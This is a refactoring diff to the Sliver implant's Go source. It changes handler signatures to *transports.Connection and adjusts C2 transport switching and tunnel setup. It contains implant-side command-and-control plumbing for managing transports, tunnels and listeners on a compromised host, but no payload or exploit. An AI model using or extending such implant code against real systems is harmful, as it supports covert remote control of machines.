@@ -29,13 +29,14 @@ import (
 	"github.com/golang/protobuf/proto"
 
 	"github.com/bishopfox/sliver/implant/sliver/comm"
+	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/commpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
 // CommHandler - Handler for managing the Comm subsystem
-type CommHandler func(*sliverpb.Envelope, Connection)
+type CommHandler func(*sliverpb.Envelope, *transports.Connection)
 
 // commHandlers - All actions pertaining to the Comm subsystem
 var commHandlers map[uint32]CommHandler
@@ -65,7 +66,7 @@ func GetCommHandlers() map[uint32]CommHandler {
 
 // Transports -------------------------------------------------------------------------------------------
 
-func c2Handler(envelope *sliverpb.Envelope, connection Connection) {
+func c2Handler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	req := &sliverpb.TransportsReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.Transports{Response: &commonpb.Response{}}
@@ -82,7 +83,7 @@ func c2Handler(envelope *sliverpb.Envelope, connection Connection) {
 	})
 }
 
-func addTransportHandler(envelope *sliverpb.Envelope, connection Connection) {
+func addTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	req := &sliverpb.TransportAddReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.TransportAdd{Response: &commonpb.Response{}}
@@ -101,8 +102,7 @@ func addTransportHandler(envelope *sliverpb.Envelope, connection Connection) {
 	}
 	c2.Priority = int(req.Priority)
 
-	// Add to available c2
-	// TODO: change code for handling priority
+	// Add to available c2, with the requested order
 	Transports.Add(c2)
 	res.Success = true
 
@@ -128,7 +128,7 @@ func addTransportHandler(envelope *sliverpb.Envelope, connection Connection) {
 
 }
 
-func deleteTransportHandler(envelope *sliverpb.Envelope, connection Connection) {
+func deleteTransportHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	req := &sliverpb.TransportDeleteReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.TransportDelete{Response: &commonpb.Response{}}
@@ -144,7 +144,7 @@ func deleteTransportHandler(envelope *sliverpb.Envelope, connection Connection) 
 	})
 }
 
-func transportSwitchHandler(envelope *sliverpb.Envelope, connection Connection) {
+func transportSwitchHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	req := &sliverpb.TransportSwitchReq{}
 	proto.Unmarshal(envelope.Data, req)
 	res := &sliverpb.TransportSwitch{Response: &commonpb.Response{}}
@@ -183,7 +183,7 @@ func transportSwitchHandler(envelope *sliverpb.Envelope, connection Connection) 
 // commTunnelHandler - A special handler that receives a Tunnel ID (sent by the server or a pivot)
 // and gives this tunnel ID to the current active Transport. The latter passes it down to the Comm
 // system, which creates the tunnel and uses it as a net.Conn for speaking with the C2 server/pivot.
-func commTunnelHandler(envelope *sliverpb.Envelope, connection Connection) {
+func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	data := &commpb.TunnelOpenReq{}
 	proto.Unmarshal(envelope.Data, data)
 
@@ -192,7 +192,7 @@ func commTunnelHandler(envelope *sliverpb.Envelope, connection Connection) {
 	// {{end}}
 
 	// Create and start a Tunnel. It is already wired up to its transports.Connection, thus working.
-	tunnel := comm.NewTunnel(data.TunnelID, Transports.Server.Connection.RequestSend)
+	tunnel := comm.NewTunnel(data.TunnelID, Transports.Active.Connection.RequestSend)
 
 	// Comm setup. This is goes on in the background, because we need
 	// to end this handler, (otherwise it blocks and the tunnel will stay dry)
@@ -210,7 +210,7 @@ func commTunnelHandler(envelope *sliverpb.Envelope, connection Connection) {
 
 // commTunnelDataHandler - Receives tunnel data over the implant's connection (in case the stack used is custom DNS/HTTPS),
 // and passes it down to the appropriate Comm tunnel. Will be written to its buffer, then consumed by the Comm's SSH layer.
-func commTunnelDataHandler(envelope *sliverpb.Envelope, connection Connection) {
+func commTunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 	data := &commpb.TunnelData{}
 	proto.Unmarshal(envelope.Data, data)
 	tunnel := comm.Tunnels.Tunnel(data.TunnelID)
@@ -237,7 +237,7 @@ func commTunnelDataHandler(envelope *sliverpb.Envelope, connection Connection) {
 
 // startHandler - Start a listener/bind handler on this implant. The handler keeps some information
 // and will transmit it with the connections it routes back to/forwards from the server.
-func startHandler(envelope *sliverpb.Envelope, connection Connection) {
+func startHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 
 	// Request / Response
 	handlerReq := &commpb.HandlerStartReq{}
@@ -302,7 +302,7 @@ TRANSPORT:
 }
 
 // closeHandler - Stops/Close a listener on this implant.
-func closeHandler(envelope *sliverpb.Envelope, connection Connection) {
+func closeHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
 
 	// Request / Response
 	handlerReq := &commpb.HandlerCloseReq{}
